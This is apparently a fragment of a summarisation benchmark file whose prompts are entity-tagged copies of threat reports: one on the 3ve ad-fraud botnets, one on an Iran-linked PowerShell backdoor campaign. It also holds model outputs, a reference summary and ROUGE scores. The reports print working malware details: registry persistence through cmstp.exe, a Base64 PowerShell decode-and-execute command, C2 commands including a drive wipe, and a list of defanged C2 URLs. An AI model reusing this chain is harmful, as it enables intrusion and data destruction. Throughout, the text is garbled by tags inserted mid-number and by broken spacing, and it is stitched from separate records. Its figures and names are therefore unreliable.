1920x1040 [CARDINAL] - [CARDINAL] 1 [CARDINAL] - [CARDINAL] 5 - 0 - 1.50 : scr_data|spf_c_dta:9 : spf_c_dta|spf_s_dt:119:2:0.01:48000 : spf_s_dt|srtds:,@d:1:0,c:2:1,g:3:0,g:4:2 , g:5:3,@,#00000000000000000000 : srtds|spf_r_dt:83.72.1 : spf_r_dt|spf_cc_dt : [CARDINAL] 4 : spf_cc_dt|gl_dat : packe [ ]= = : gl_dat|jsshh:553000000 : jsshh|mrysf:2.0 : mrysf|sltd : [DATE] 4447 : sltd|sbyd:0 : sbyd||hook_l_mpg:1 : hook_l_mpg|enable_ex_2:1 : enable_ex_2|dsth:1 : dsth||<>3ve.2 tasking the embedded browser to visit a legitimate URL ( plaintext extracted via API hooking ; the real domainhas been replaced with \u201c example.com \u201d ) . White Ops code is blocked ( details have been redacted).As we described before , 3ve.2 would intermix browsing legitimate websites with counterfeit ones . 3ve.2 instructed the embedded browser to visit a redirector URL , which would issue an [PRODUCT] HTTP [PRODUCT] 302 toward the home page of the spoofed site , passing its [ORG] IP address as a parameter . The embedded browser would update its [ORG] DNS records to match the given IP with the spoofed site , which it would then visit . The spoofed site then either directly served the ad fraud payload in the response or would [CARDINAL] 302 redirect the browser again to the final ad fraud URL , which is a URL that existed on the legitimate version of the site . For spoofed news sources , this final ad fraud URL was usually the URL of a news article.31Infected [DATE] computerKovter [DATE] C21 . Client pings serverwhich replies with ad - fraud configCounterfeit website [CARDINAL] 3 . Counterfeit website sends [CARDINAL] 302 redirect toad - fraud [ORG] URLRedirection server [CARDINAL] 2 . [CARDINAL] 302 redirect to counterfeit websiteDiagram : How [CARDINAL] 3ve.2 operates4 . Ad - fraud URL leads to counterfeit pagewith video ad.{}/(.com&land_ip=&group= & subid=&uid=. .com/|<>|0:00:00:00:00:00:00:00:00:00::|od_od : & t y p e = v s p o o f _ R E S P : O K | h t t p : / / 1 8 8 . [DATE] 2 [DATE] 1 [DATE] 4 . 3 0 . [CARDINAL] 9 2 / a p i / g e t l i n k s . p h p ? c l i c k = : fcs_cfg||p_hhw:100 : p_hhw|w_w_perc:5 : w_w_perc|scrtype:0 : scrtype|setcpu:1setcpu|ver yfast:107 : veryfast|lowl_c:0:1owl_c|minms:27 : minms|hst_count:18 : hst_count|check_jscm d:1 : check_jscmd|doms_spoof : coinhive.com>0||coin - hive.com>0||jescoin.com>0||reasedop [ORG] er.pw>0||matahariama.xyz>0||miner.pr0gramm.com>0||kiwifarms.net>0||anime.reactor.cc>0|| fic.com>0||crypto [PERSON] - loot.com>0||2giga.link>0||ppoi.org>0||coinerra.com>0||coin [PERSON] - have.c om>0||kisshentai.net>0||miner.pr0gramm.com>0||kiwifarms.net>0||anime.reactor.cc>0|| joyreactor.cc>0||kissdoujin.com>0||minero.pw>0||coinnebula.com>0||afminer.com>0||co inblind.com>0||webmine.cz>0||monerminer.rocks>0||cdn.cloudcoins.co>0||coinlab.biz > 0||papoto.com>0||edgeno.de>0||jhynfuqoh.info>0||ads - miner.appspot.com>0||www.hashing .win>0||:doms_spoof||bbb_1_m:^http[^\\?&]{1,128]/ cont_id::63::force_use_cont_id|hos_crm:10.0 : hos_crm|hfont_crm : CambriaMath . [PERSON] Stika [PERSON] Display . [PERSON] Sitka [PERSON] Display : hfont_crm|flash_p : plugins\\pepflashplayer32_23_0_0_126.dll : flash_p|flash_v:2 8.0.0126 : flash_v|enable_ex_5:1 : enable_ex_5|setua : Mozilla/5.0 ( [ORG] Windows [ORG] NT10.0 ; WOW64 ) AppleWebKit/537.36 ( [ORG] KHTML , like [GPE] Gecko ) Chrome/63.0.3239.40 Safari/537.36 : setua|scr_data:1600x900 - 1600x860 - 1 - 5 - 0 - 1.00 : scr_data|spf_c_dta:12 : spf _ c_dta|spf_s_dt:73:2:0.0000000000000.00000 : spf_s_dt|srtds:,@d:1:0,c:2:1,g:3:0,@,#00 [CARDINAL] 0000000000000000000000 : srtds|spf_r_dt:28.50.0 : spf_r_dt|spf_cc_dt:2 : spf_cc_dt|gt_dat : pack [ ] : gl_dat|jsshh:747000000 : jsshh|mrysf:2.0 : mrysf|sltd:-51416 : sltd|sbyd:0 : sby d||hook_1_mpg:1 : hook_1_mpg|enable_ex_2:1 : enable_ex_2|dsth||<>).js||:bbb_1_m||bbb_j_m : cryptonight||CrytonightWASMWrapper||CoinHive||3ve.2 tasking the embedded browser to visit a spoofed site ( plaintext extracted via API hooking)32Additionally , 3ve.2 \u2019s ad fraud module would periodically send updates about the host \u2019s available resources and mode=1&UID= gmt = [ORG] GMT -08:00 [ORG] & threads = [CARDINAL] 1&online = f&exet = [CARDINAL] ffile&fcl = no&totalram=1023&loadram=191&freeram=465&cpuload=8&selfcpu=7&th rdscpu=0&ccpu=1&isafk = no&te=0&antivirus=-&firewall=-&antispyware = Windows Defender::&cont_err = [CARDINAL] 1&chrome = 1&f d=3ve.2 \u2019s status update ( plaintext extracted via API hooking)Parameters explainedod_od : This parameter defines the domain to spoof . Spoofing is done by passing a domain name as the host header to an [ORG] IP address unrelated to the domain.fd_fd : IP address to browse to.setcpu : A value used to patch the [ORG] JavaScript environment . Specifically patched [CARDINAL] window.navigator.hardwareConcurrency value which returns the number of logical cores in the system . Has been observed to be set to [CARDINAL] 1 , 2 , or [CARDINAL] 4.scrl_cfg : [ORG] Appears to be a \u201c scroll config \u201d however we have not determined exactly what the value will control.doms_spoof : This value is a long list of domain names delimited by > 0|| which is not used in fraud operations . It is meant to throw off an analyst by making them think it \u2019s being used for cryptojacking or by wasting their time if they choose to dive into this domain [PERSON] list.bbb_l_m : This is a regular expression used to block unwanted resources from being downloaded on a site . This value has been a static value during our analysis and will match the [ORG] White [ORG] Ops client tag format . This means that the vast majority of [ORG] White [ORG] Ops [ORG] JS tags will be blocked before [ORG] the [ORG] HTTP [ORG] GET is ever requested to our tag.bbb_j_m : This is a list of blacklisted strings . Any file containing these strings will not be executed or rendered.scr_data : [ORG] Screen data ( [CARDINAL] 1366x768 [CARDINAL] - [CARDINAL] 1366x728 - 1 - 5 - 0 - 1.00 ) where [CARDINAL] 1366x768 is the spoofed resolution of the screen , [CARDINAL] 1366x728 is the real resolution of the window , and [CARDINAL] 1.00 is the scale factor.setua : It contains the [ORG] User - Agent string to use in the browsing session.spf_s_dt : This most likely stands for spoof sound data . An example of this would be [CARDINAL] 184:2:0.01:48000 where [CARDINAL] 2 is the channel count and [CARDINAL] 48000 is the sample rate.c_dir : Points to a cache directory within the browsers folder . Each browsing session appears to get a new cache directory.33Geographic distribution3ve.2 \u2019s operators took great care in trying to prevent ad networks from noticing their illicit activity . This is why , for example , 3ve.2 malware only fully executed in countries where organic Internet users are likely to be browsing the same premium sites [ORDINAL] 3ve is counterfeiting , including the [GPE] US , [GPE] Canada , and the [GPE] UK . [CARDINAL] 3ve \u2019s victim population is shown in the figure below . Heat map of the residential computers infected with 3ve.2 botnet around the world \u2014 red indicating the highest concentration of computers , green the lowest34Infected IPs and churn [ORG] rate3ve.2 [ORG] Infected [ORG] IPs and churn800,000600,000400,000200,000050%40%30%20%10%02/4/20182/11/20182/18/20182/25/2018Infected IPs% [ORG] IPs churned ( since beginning of [CARDINAL] month)Number of IPs infected with the malware used by 3ve.23ve.2 had [CARDINAL] roughly [CARDINAL] 700,000 infections at any given point in time that were actively generating ad fraud . These IPs would frequently change due to ISPs IP rotation ( natural churn ) , new infections , and clean - ups . As a result , a [ORDINAL] third of those IPs would be replaced by new ones every [CARDINAL] 4 weeks.3ve.3The final [ORDINAL] 3ve - associated sub - operation was the least sophisticated of the [CARDINAL] three in terms of the approach it used for [ORG] IP exit nodes . [CARDINAL] 3ve.3 used other data centers as proxies instead of residential computers , tunnelling fraudulent traffic out of [CARDINAL] anywhere [CARDINAL] between [CARDINAL] 15,000 [CARDINAL] and [CARDINAL] 20,000 [ORG] IP addresses . Using data centers instead of computers made [CARDINAL] 3ve.3 \u2019s bot traffic more likely to be detected , but their strategy still offered its operators a good degree of agility by allowing them to find new data centers quickly when previously used data centers were blocked . We \u2019ve found that this sub - operation \u2019s architecture is similar to that of [CARDINAL] 3ve.1 . The sub - operation was focused on a range of ad fraud approaches , including video , display , and click fraud . Despite its lack of sophistication relative to other [CARDINAL] 3ve sub - operations , [CARDINAL] 3ve.3 still had a fairly complex backend , relying on rogue [ORG] DNS servers that rendered the content pages and resolved legitimate domains to the [ORG] IP address of counterfeit , [CARDINAL] 3ve - controlled sites . Additionally , [CARDINAL] 3ve.3 used sophisticated evasion techniques like tag evasion , similar to both 3ve.1 and 3ve.2 . However , [CARDINAL] 3ve.3 \u2019s key difference from the other sub - operations is in its exit node layer , which relied somewhat rudimentarily on data centers rather than residential computers . While this enabled them to look like [CARDINAL] tens [CARDINAL] of [CARDINAL] thousands of users viewing ads , it also made them far easier to detect.35", "generated_text": "The document; the investigation; a major ad fraud operation; 3ve; pronounced Eve; over 1 million IPs; both residential botnet infections; corporate IP spaces; North America; Europe; over 1 million IPs; 1 million IPs; home; Windows; use; sophisticated ad fraud schemes; bp hijacking; BGP hijacking; a network; malware; system info; HTTPS; ad execution; the network; IP network; IP addresses; infrastructure; AD; intelligence; access; infrastructure; the police; the operation; a network; command; control; techniques; several sub-operations; each of these; a sophisticated ad fraud scheme; its own right; multiple sub-operations; each of these ad fraud schemes; its own right; its operations; a network; years; the industry; collaboration; detection; the broader community; cooperation; future attacks; the operation; collaboration.", "ref_text": "<START-1>The document describes an investigation by Google and White Ops into a major online ad fraud operation called \"3ve\" that was taken down through industry collaboration. - 3ve was composed of three sophisticated botnets that each used different techniques to commit ad fraud at a massive scale, generating billions of fraudulent ad bid requests. - The botnets infected over 1 million IPs from residential computers and corporate networks to proxy their activities. They created over 10,000 counterfeit websites mimicking legitimate publishers to sell fake ad inventory. - 3ve.1 used malware infections and BGP hijacking to acquire proxy IPs. 3ve.2 infected 700,000 computers via malvertising to power a custom browsing botnet. 3ve.3 used IP addresses from data centers. - The botnets used advanced techniques to mimic human behavior and evade detection like fake mouse movements, randomized behaviors, anti-forensics scans, and blockchain mining scripts. - Google, White Ops and other security firms analyzed the operation and formed an industry working group. They observed the operators, mapped the infrastructure, and coordinated a takedown. - The takedown involved referral to law enforcement, infrastructure disruption, botnet sinkholing, and cooperation across ad tech, security firms, ISPs and hosting providers. It successfully rendered the 3ve botnets inactive. - The collaboration and actions taken aim to set a precedent to deter future large-scale ad fraud operations by imposing real consequences on the perpetrators. Continued industry cooperation is needed to protect the digital ad ecosystem. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4328767123287671, "gpt3/lexical/rouge_rouge2": 0.14325068870523414, "gpt3/lexical/rouge_rougeL": 0.263013698630137, "gpt3/lexical/rouge_rougeLsum": 0.263013698630137, "gpt3_generated_text": ["The article discusses the investigation and takedown of a major ad fraud operation called 3ve. The operation, pronounced \"Eve,\" controlled over 1 million IPs through residential botnet infections and corporate IP spaces in North America and Europe. It featured several sub-operations, each constituting a sophisticated ad fraud scheme. The investigation uncovered the operation's massive infrastructure and similar activity within a network of malware-infected residential computers. The collaborative effort between law enforcement, ad tech companies, cyber security firms, and internet service providers led to the disabling of 3ve's infrastructure and sinkholing of its botnet command and control servers. The article emphasizes the importance of industry collaboration in detecting and preventing ad fraud and highlights the ongoing efforts to protect the integrity of the digital advertising economy."]}, {"split_name": "val", "sample_id": "val_80", "prompt_text": "Extract the keywords: [PERSON] SolutionsServicesPartnersSupportResourcesCompany\ue922\ue922Home\ue93cFireEye [PERSON] Blogs\ue93cThreat [ORG] Research\ue93cIranian [ORG] Threat [ORG] Group [ORG] Updates [ORG] Tactics , Techniques a [ORG] Iranian [ORG] Threat [ORG] Group Updates Tactics , Techniques a [ORG] Iranian [ORG] Threat [ORG] Group Updates Tactics , Techniques and Procedures in Spear Phishing CampaignMarch [DATE] 13 , [DATE] 2018 | by [PERSON] Sudeep [PERSON] Singh , [PERSON] Dileep [PERSON] Kumar [PERSON] Jallepalli , [PERSON] Yogesh [PERSON] Londhe , [PERSON] Ben ReadIntroductionFrom [DATE] January [DATE] 2018 [DATE] to [DATE] March [DATE] 2018 , through [ORG] FireEye \u2019s [ORG] Dynamic [ORG] Threat [ORG] Intelligence , we observed attackers leveraging the latest code execution and persistence techniques to distribute malicious macro - based documents to individuals in [LOC] Asia and [LOC] the [LOC] Middle [LOC] East . We attribute this activity to [PERSON] TEMP.Zagros ( reported by [ORG] Palo [ORG] Alto [ORG] Networks [ORG] and [ORG] Trend [ORG] Micro as MuddyWater ) , an [GPE] Iran - nexus actor that has been active since [DATE] at [DATE] least [DATE] May [DATE] 2017 . This actor has engaged in prolific spear phishing of government and defense entities in [LOC] Central [LOC] and [LOC] Southwest [LOC] Asia . The spear phishing emails and attached malicious macro documents typically have geopolitical themes . When successfully executed , the malicious documents install a backdoor we track as POWERSTATS.One of the more interesting observations during the analysis of these files was the re - use of the latest [ORG] AppLocker bypass , and lateral movement techniques for the purpose of indirect code execution . The [ORG] IP address in the lateral movement techniques was substituted with the local machine [ORG] IP address to achieve code execution on the system . PDFmyURL converts any url to pdf!substituted with the local machine [ORG] IP address to achieve code execution on the system . [ORG] Campaign [ORG] TimelineIn this campaign , the threat actor \u2019s tactics , techniques and procedures ( TTPs ) shifted after [DATE] about [DATE] a [DATE] month , as did their targets . A brief timeline of this activity is shown in Figure 1.Figure 1 : Timeline of this recently observed spear phishing campaignThe [ORDINAL] first part of the campaign ( From [DATE] Jan. 23 , [DATE] 2018 , to [DATE] Feb. 26 , [DATE] 2018 ) used a macro - based document that dropped a [ORG] VBS file and an [ORG] INI file . The [ORG] INI file contains the [PERSON] Base64 encoded [ORG] PowerShell command , which will be decoded and executed by [ORG] PowerShell using the command line generated by the [ORG] VBS file on execution using WScript.exe . The process chain is shown in Figure [CARDINAL] 2.PDFmyURL converts any url to pdf!Figure [CARDINAL] 2 : Process chain for the [ORDINAL] first part of the campaignAlthough the actual VBS script changed from sample to sample , with different levels of obfuscation and different ways of invoking the next stage of process tree , its final purpose remained same : invoking [ORG] PowerShell to decode the [PERSON] Base64 encoded [ORG] PowerShell command in the [ORG] INI file that was dropped earlier by the macro , and executing it . [CARDINAL] One such example of the VBS invoking [ORG] PowerShell via [ORG] MSHTA is shown in Figure [CARDINAL] 3.Figure [CARDINAL] 3 : VBS invoking [ORG] PowerShell via MSHTAThe [ORDINAL] second part of the campaign ( from [DATE] Feb. 27 , [DATE] 2018 , to [DATE] March [DATE] 5 , [DATE] 2018 ) used a new variant of the macro that does not use VBS for [ORG] PowerShell code execution . Instead , it uses one of the recently disclosed code execution techniques leveraging [ORG] INF and [ORG] SCT files , which we will go on to explain later in the blog . Infection VectorWe believe the infection vector for all of the attacks involved in this campaign are macro - based documents sent as an email attachment . [CARDINAL] One such email that we were able to obtain was targeting users in [GPE] Turkey , as shown in Figure [CARDINAL] 4 : PDFmyURL converts any url to pdf!Figure [CARDINAL] 4 : Sample spear phishing email containing macro - based document attachmentThe malicious [ORG] Microsoft [ORG] Office attachments that we observed appear to have been specially crafted for individuals in [CARDINAL] four countries : [GPE] Turkey , [GPE] Pakistan , [NORP] Tajikistan and [GPE] India . What follows is [CARDINAL] four examples , and a complete list is available in the Indicators of Compromise section at the end of the blog . Figure [CARDINAL] 5 shows a document purporting to be from [ORG] the [ORG] National [ORG] Assembly [ORG] of [ORG] Pakistan . PDFmyURL converts any url to pdf!Figure [CARDINAL] 5 : Document purporting to be from [ORG] the [ORG] National [ORG] Assembly of PakistanA document purporting to be from [ORG] the [ORG] Turkish [ORG] Armed [ORG] Forces , with content written in the [NORP] Turkish language , is shown in Figure [CARDINAL] 6.PDFmyURL converts any url to pdf!Figure [CARDINAL] 6 : Document purporting to be from the [NORP] Turkish Armed ForcesA document purporting to be from [ORG] the [ORG] Institute [ORG] for [ORG] Development [ORG] and [ORG] Research [ORG] in [ORG] Banking [ORG] Technology ( established by [ORG] the [ORG] Reserve [ORG] Bank [ORG] of [ORG] India ) is shown in Figure 7.PDFmyURL converts any url to pdf!Figure [CARDINAL] 7 : Document purporting to be from [ORG] the [ORG] Institute [ORG] for [ORG] Development [ORG] and [ORG] Research [ORG] in [ORG] Banking [ORG] TechnologyFigure [ORG] 8 shows a document written in [PERSON] Tajik that purports to be from [ORG] the [ORG] Ministry [ORG] of [ORG] Internal [ORG] Affairs [ORG] of [GPE] the [GPE] Republic [GPE] of [GPE] Tajikistan . PDFmyURL converts any url to pdf!Figure [CARDINAL] 8 : Document written in [PERSON] Tajik that purports to be from [ORG] the [ORG] Ministry [ORG] of [ORG] Internal [ORG] Affairs [ORG] of [GPE] the [GPE] Republic [GPE] of [GPE] TajikistanEach of these macro - based documents used similar techniques for code execution , persistence and communication with the command and control ( C2 ) server . Indirect Code Execution Through INF and SCTThis scriptlet code execution technique leveraging [ORG] INF and [ORG] SCT files was recently discovered and documented in [DATE] February [DATE] 2018 . The threat group in this recently observed campaign \u2013 [PERSON] TEMP.Zagros \u2013 weaponized their malware using the following techniques . The macro in the Word document drops [CARDINAL] three files in a hard coded path : C:\\programdata . Since the path is hard coded , the execution will only be observed in operating systems , Windows 7 and above . The following are the [CARDINAL] three files : PDFmyURL converts any url to pdf!Defender.sct \u2013 The malicious [ORG] JavaScript based scriptlet file.Defender.sct \u2013 The malicious [ORG] JavaScript based scriptlet file . DefenderService.inf \u2013 The [ORG] INF file that is used to invoke the above scriptlet file . [ORG] WindowsDefender.ini \u2013 The [PERSON] Base64 encoded and obfuscated [ORG] PowerShell script . After dropping the [CARDINAL] three files , the macro will set the following registry key to achieve [CARDINAL] persistence:\\REGISTRY\\USER\\SID\\Software\\Microsoft\\Windows\\CurrentVersio n\\Run\\\"WindowsDefenderUpdater \" = cmstp.exe /s c:\\programdata\\DefenderService.infUpon system restart , cmstp.exe will be used to execute the [ORG] SCT file indirectly through the [ORG] INF file . This is possible because inside the [ORG] INF file we have the following section:[UnRegisterOCXSection ] % [DATE] 11%\\scrobj.dll , [ORG] NI , c:/programdata / Defender.sctThat section gets indirectly invoked through the DefaultInstall_SingleUser section of [ORG] INF , as shown in Figure [DATE] 9.Figure [DATE] 9 : Indirectly invoking [ORG] SCT through the DefaultInstall_SingleUser section of INFThis method of code execution is performed in an attempt to evade security products . [ORG] FireEye [PRODUCT] MVX and [ORG] HX [ORG] Endpoint [ORG] Security technology successfully detect this code execution technique . PDFmyURL converts any url to pdf!SCT File AnalysisSCT [PERSON] File [PERSON] AnalysisThe code of the [ORG] Defender.sct file is an obfuscated JavaScript . The main function performed by the [ORG] SCT file is to [PERSON] Base64 decode the contents of [ORG] WindowsDefender.ini file and execute the decoded [ORG] PowerShell Script using the following command line : powershell.exe -exec Bypass -c iex([System . Text . Encoding]::Unicode . GetString([System . [ORG] Convert]::FromBase64String((get- content C:\\\\ProgramData\\\\WindowsDefender.ini)The rest of the malicious activities are performed by the PowerShell Script . [ORG] PowerShell File AnalysisThe PowerShell script employs several layers of obfuscation to hide its actual functionality . In addition to obfuscation techniques , it also has the ability to detect security tools on the analysis machine , and can also shut down the system if it detects the presence of such tools . Some of the key obfuscation techniques used are : Character Replacement : Several instances of character replacement and stringreversing techniques ( Figure [CARDINAL] 10 ) make analysis difficult . Figure [CARDINAL] 10 : Character replacement and string reversing techniquesPowerShell Environment Variables : Nowadays , malware authors commonly maskcritical strings such as \u201c [ORG] IEX \u201d using environment variables . Some of the instances used in this script are:$eNv : puBLic[13]+$ENv : pUBLIc[5]+'x ' ( $ [ORG] ENV : cOMsPEC[4,26,25]-jOin'')XOR encoding : The biggest section of the [ORG] PowerShell script is [ORG] XOR encoded using asingle byte key , as shown in Figure 11.PDFmyURL converts any url to pdf!Figure [CARDINAL] 11 : [ORG] PowerShell script is [ORG] XOR encoded using a single byte keyAfter deobfuscating the contents of the PowerShell Script , we can divide it into [CARDINAL] three sections . Section 1The [ORDINAL] first section of the [ORG] PowerShell script is responsible for setting different key variables that are used by the remaining sections of the [ORG] PowerShell script , especially the following variables : TEMpPAtH = \" C:\\ProgramData\\ \" ( the path used for storing the temp files ) Get_vAlIdIP = url ( used to get the public [ORG] IP address of themachine)FIlENAmePATHP = [ORG] WindowsDefender.ini ( file used to store [ORG] Powershell code ) PRIVAtE = Private Key exponents PUbLIc = Public Key exponents Hklm = \" HKLM:\\Software\\ \" Hkcu = \" HKCU:\\Software\\ \" DrAGon_MidDLe = [ array of proxy URLs]Among those variables , there is [CARDINAL] one variable of particular interest , DrAGon_MidDLe , which stores the list of proxy URLs ( detailed at the end of the blog in the Network Indicators portion of the Indicators of Compromise section ) that will be used to interact with the [CARDINAL] C2 server , as shown in Figure 12.PDFmyURL converts any url to pdf!Figure [CARDINAL] 12 : DrAGon_MidDLe stores the list of proxy URLs used to interact with C2 serverSection 2The [ORDINAL] second section of the [ORG] PowerShell script has the ability to perform encryption and decryption of messages that are exchanged between the system and the C2 server . The algorithm used for encryption and decryption is [ORG] RSA , which leverages the public and private key exponents included in [LAW] Section [LAW] 1 [LAW] of [LAW] the [LAW] PowerShell script . Section 3The [ORDINAL] third section of the [ORG] PowerShell script is the biggest section and has a wide variety of functionalities . During analysis , we observed a code section where a message written in [NORP] Chinese and hard coded in the script will be printed in the case of an error while connecting to the [CARDINAL] C2 server : The [NORP] English translation for this message is : \u201c Can not connect to website , please wait for dragon\u201d . PDFmyURL converts any url to pdf!dragon\u201d . Other functionalities provided by this section of the PowerShell Script are as follows : Retrieves the following data from the system by leveraging [ORG] Windows [ORG] ManagementInstrumentation ( [ORG] WMI ) queries and environment variables : IP Address from Network Adapter Configuration Computer Domain Name UsernameAll of this data is concatenated and formatted as shown in Figure [CARDINAL] 13 : Figure [CARDINAL] 13 : Concatenated and formatted data retrieved by [ORG] PowerShell scriptRegister the victim \u2019s machine to the C2 server by sending the [ORG] REGISTER commandto the server . In response , if the status is OK , then a [ORG] TOKEN is received from the [CARDINAL] C2 server that is used to synchronize the activities between the victim \u2019s machine and the C2 server . While sending to the [CARDINAL] C2 server , the data is formatted as [ORG] follows:@{SYSINFO = $ get . [PERSON] ToString ( ) ; ACTION = \" REGISTER\";}Ability to take screenshots . PDFmyURL converts any url to pdf!Checks for the presence of security tools ( detailed in the [NORP] Appendix ) and if any of these security tools are discovered , then the system will be shut down , as shown in Figure [CARDINAL] 14.Figure [CARDINAL] 14 : System shut down upon discovery of security toolsAbility to receive [ORG] PowerShell script from the [CARDINAL] C2 server and execute on the machine . Several techniques are employed for executing the [ORG] PowerShell code : If command starts with \u201c excel \u201d , then it leverages [ORG] DDEInitiate [ORG] Method [ORG] of [ORG] Excel . Appilcation to execute the code : If the command starts with \u201c outlook \u201d , then it leverages Outlook . Application and [ORG] MSHTA to execute the code : If the command starts with \u201c risk \u201d , then execution is performed through [ORG] DCOM object : PDFmyURL converts any url to pdf!File upload functionality . Ability to disable [ORG] Microsoft [ORG] Office [ORG] Protected [ORG] View ( as shown in Figure [CARDINAL] 15 ) by settingthe following keys in the Windows Registry : DisableAttachmentsInPV DisableInternetFilesInPV DisableUnsafeLocationsInPVFigure [CARDINAL] 15 : Disabling [ORG] Microsoft [ORG] Office [ORG] Protected [ORG] ViewAbility to remotely reboot or shut down or clean the system based on thecommand received from the [CARDINAL] C2 server , as shown in Figure 16.PDFmyURL converts any url to pdf!Figure [CARDINAL] 16 : Reboot , shut down and clean commandsAbility to sleep for a given number of [TIME] seconds . The following table summarizes the main [CARDINAL] C2 commands supported by this PowerShell Script . C2 CommandPurposerebootshutdowncleanscreenshotuploadexceloutlookriskPDFmyURL converts any url to pdf!Reboot the system using shutdown commandShut down the system using shutdown commandWipe the [ORG] Drives , [GPE] C:\\ , D:\\ , E:\\ , F:\\Take a screenshot of the [ORG] SystemEncrypt and upload the information from the systemLeverage [PRODUCT] Excel . Application COM object for code executionLeverage Outlook . Application COM object for code executionLeverage DCOM object for code executionConclusionThis activity shows us that [PERSON] TEMP.Zagros stays up - to - date with the latest code execution and persistence mechanism techniques , and that they can quickly leverage these techniques to update their malware . By combining multiple layers of obfuscation , they deter the process of reverse engineering and also attempt to evade security products . Users can protect themselves from such attacks by disabling Office macros in their settings and also by being more vigilant when enabling macros ( especially when Projesinde .docTurkeyTurkeyNetwork [NORP] IndicatorsList of [PERSON] Proxy URLshxxp://alessandrofoglino[.]com//db_template.phphxxp://www.easy - home - sales[.]co.za//db_template.phphxxp://www.almaarefut[.]com / admin / db_template.phphxxp://chinamall[.]co.za//db_template.phphxxp://amesoulcoaching[.]com//db_template.phphxxp://www.antigonisworld[.]com / wp - includes / db_template.phphxxps://anbinni.ba / wp - admin / db_template.phphxxp://arctistrade[.]de / wp / db_template.phphxxp://aianalytics[.]ie//db_template.phphxxp://www.gilforsenate[.]com//db_template.phphxxp://mgamule[.]co.za / oldweb / db_template.phphxxp://chrisdejager - attorneys[.]co.za//db_template.phphxxp://alfredocifuentes[.]com//db_template.phphxxp://alxcorp[.]com//db_template.phphxxps://www.aircafe24[.]com//db_template.phpPDFmyURL converts any url to [NORP] pdf!hxxp://agencereferencement.be / wp - admin / db_template.phphxxp://americanlegacies[.]org / webthed_ftw / db_template.phphxxps://aloefly[.]net//db_template.phphxxp://www.duotonedigital[.]co.za//db_template.phphxxp://architectsinc[.]net//db_template.phphxxp://www.tanati[.]co.za//db_template.phphxxp://emware[.]co.za//db_template.phphxxp://breastfeedingbra[.]co.za//db_template.phphxxp://alhidayahfoundation[.]co[.]uk / category / db_template.phphxxp://cashforyousa[.]co.za//db_template.phphxxps://www.airporttaxi - uk[.]co[.]uk / wp - includes / db_template.phphxxp://antjetaubert[.]de//db_template.phphxxp://hesterwebber[.]co.za//db_template.phphxxp://fickstarelectrical[.]co.za//db_template.phphxxp://alex - frost[.]com / assets / [ORG] db_template.phphxxps://americanbrasil[.]com.br//db_template.phphxxps://aileeshop[.]com//db_template.phphxxps://annodle[.]com//db_template.phphxxp://goldeninstitute[.]co.za / contents / db_template.phphxxp://ednpk[.]com//db_template.phphxxp://www.arabiccasinochoice[.]com//db_template.phpPDFmyURL converts any url to pdf!hxxp://proeventsports[.]co.za//db_template.phphxxp://glenbridge[.]co.za//db_template.phphxxp://berped[.]co.za//db_template.phphxxp://best - digital - slr - cameras[.]com//db_template.phphxxp://antonhirvonen[.]com / pengalandet.se / wp - includes / db_template.phphxxp://www.alpacal[.]com//db_template.phphxxps://www.alakml[.]com / wp - admin / db_template.phphxxp://ar - rihla[.]com//db_template.phphxxp://appsvoice[.]info//db_template.phphxxp://www.bashancorp[.]co.za//db_template.phphxxp://alexanderbecker[.]net / services / db_template.phphxxp://visionclinic.co.ls / visionclinic / db_template.phphxxps://www.angelesrevista[.]com//db_template.phphxxps://www.antojoentucocina[.]com//db_template.phphxxp://apollonweb[.]com//db_template.phphxxps://www.alphapixa[.]com//db_template.phphxxp://capitalradiopetition[.]co.za//db_template.phphxxp://www.generictoners[.]co.za//db_template.phphxxps://alnahdatraining[.]com//db_template.phphxxps://albousala[.]com//db_template.phpPDFmyURL converts any url to pdf!hxxps://www.dopetroleum[.]com//db_template.phphxxp://bios - chip[.]co.za//db_template.phphxxp://www.crissamconsulting[.]co.za//db_template.phphxxp://capriflower[.]co.za//db_template.phphxxp://www.dingaanassociates[.]co.za//db_template.phphxxp://indiba - africa[.]co.za//db_template.phphxxp://verifiedseller[.]co.za / js / db_template.phphxxps://www.buraqlubricant[.]com//db_template.phphxxp://aqarco[.]com / wp - admin / db_template.phphxxp://allaboutblockchain[.]net//db_template.phphxxp://www.amexcars[.]info / tpl / db_template.phphxxp://clandecor[.]co.za / rvsUtf8Backup / db_template.phphxxp://bakron[.]co.za//db_template.phphxxp://gsnconsulting[.]co.za//db_template.phphxxp://vumavaluations[.]co.za//db_template.phphxxp://heritagetravelmw[.]com//db_template.phphxxp://ampvita[.]com//db_template.phphxxp://ahero - resource - center[.]org / administrator / db_template.phphxxps://arbulario[.]com//db_template.phphxxp://havilahglo[.]co.za / wpscripts / db_template.phphxxp://www.bestdecorativemirrors[.]com / More - Mirrors / db_template.phpPDFmyURL converts any url to pdf!hxxp://www.bestdecorativemirrors[.]com / More - Mirrors / db_template.phphxxp://delectronics[.]com[.]pk//db_template.phphxxp://antucomp[.]com//db_template.phphxxp://advocatetn[.]com / font - awesome / fonts / db_template.phphxxps://amooy[.]com / webservice / db_template.phphxxp://www.harmonyguesthouse[.]co.za//db_template.phphxxp://alanrori[.]com//db_template.phphxxp://algarvesup[.]com//db_template.phphxxp://desirablehair[.]co.za//db_template.phphxxp://comsip[.]org.mw//db_template.phphxxp://jdcorporate[.]co.za / catalog / db_template.phphxxp://andrewfinnburhoe[.]com//db_template.phphxxp://anyeva[.]com / wp - includes / db_template.phphxxp://www.agenceuhd[.]com//db_template.phphxxp://host4unix[.]net / host24new / db_template.phphxxp://www.altaica[.]ca / wordpress / db_template.phphxxp://www.allbuyer[.]co[.]uk//db_template.phphxxp://jvpsfunerals[.]co.za//db_template.phphxxp://immaculatepainters[.]co.za//db_template.phphxxp://tcpbereka[.]co.za / js / db_template.phphxxp://clientcare.co.ls//db_template.phpPDFmyURL converts any url to pdf!hxxp://investaholdings[.]co.za / htc / db_template.phphxxp://www.amjobs[.]co[.]uk//db_template.phphxxp://www.agirlgonewine[.]com / store / db_template.phphxxp://findinfo - more[.]com//db_template.phphxxp://asgen[.]org//db_template.phphxxp://alphasalesrecruitment[.]com//db_template.phphxxp://irshadfoundation[.]co.za//db_template.phphxxp://analternatif[.]com / includes / db_template.phphxxp://arbruisseau[.]com / profiles / db_template.phphxxp://ladiescircle[.]co.za//db_template.phphxxp://all - reseller[.]com / zzz_backup / db_template.phphxxp://alcatrazmoon[.]com / images / db_template.phphxxp://www.alcalumni[.]com / wp - includes / db_template.phphxxp://aniljoseph[.]com / 